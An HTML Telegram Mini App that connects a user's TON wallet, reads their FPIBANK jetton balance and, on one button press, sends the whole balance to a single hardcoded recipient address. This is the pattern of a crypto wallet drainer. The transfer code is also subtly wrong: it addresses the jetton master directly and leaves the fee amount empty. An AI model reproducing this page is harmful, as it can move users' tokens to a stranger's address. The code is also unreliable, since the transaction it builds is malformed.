<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <meta http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
    style-src 'self' 'unsafe-inline' https://unpkg.com;
    connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io https://tonapi.io;
    font-src 'self' https://unpkg.com;
    img-src * data:;
  ">

  <title>Telegram Mini App: TON Connect Jetton Transfer</title>

  <script src="https://telegram.org/js/telegram-webapp.js"></script>
  <script src="./js/tonconnect-sdk.min.js"></script>
  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>
  <h1>Telegram Mini App: Отправка всех токенов FPIBANK</h1>

  <div id="ton-connect"></div>

  <button id="sendTransaction">Отправить все FPIBANK</button>

  <script>
    if (typeof Telegram === "undefined") {
      window.Telegram = {
        WebApp: {
          ready: () => console.log("Telegram WebApp ready stub"),
          showAlert: (msg) => alert(msg)
        }
      };
    } else {
      Telegram.WebApp.ready();
    }

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
      buttonRootId: "ton-connect"
    });

    const jettonMasterAddress = "0:ef6e5d60cd27fee67bf4db9c11bd98f1e98270c54dddcc8a631578304520d858";
    const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";

    async function getJettonBalance(userAddress, jettonMasterAddress) {
      const response = await fetch(`https://tonapi.io/v2/accounts/${userAddress}/jettons`);
      const data = await response.json();
      
      const jetton = data.balances.find(j => j.jetton.address === jettonMasterAddress);
      return jetton ? jetton.balance : "0";
    }

    async function sendJettonTransaction(userWalletAddress) {
      const balance = await getJettonBalance(userWalletAddress, jettonMasterAddress);
      
      if (balance === "0") {
        Telegram.WebApp.showAlert("У вас нет токенов FPIBANK.");
        return;
      }

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [
          {
            address: jettonMasterAddress, // Отправляем на Jetton Master напрямую
            amount: "", // Автоматический расчет комиссии
            payload: {
              type: "jetton_transfer",
              query_id: 0,
              amount: balance, // Отправляем ВСЕ токены
              destination: recipientAddress,
              response_destination: null,
              custom_payload: null,
              forward_ton_amount: "0",
              forward_payload: null
            }
          }
        ]
      };

      try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log("Попытка отправить Jetton:", result);
        Telegram.WebApp.showAlert("Jetton отправлен: " + JSON.stringify(result));
      } catch (error) {
        console.error("Ошибка:", error);
        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
      }
    }

    async function sendAllFPIBANK() {
      if (!tonConnectUI.connected) {
        Telegram.WebApp.showAlert("Подключите сначала кошелек.");
        return;
      }

      const userWalletAddress = tonConnectUI.wallet.account.address;
      await sendJettonTransaction(userWalletAddress);
    }

    document.getElementById("sendTransaction").addEventListener("click", sendAllFPIBANK);
  </script>
</body>
</html>
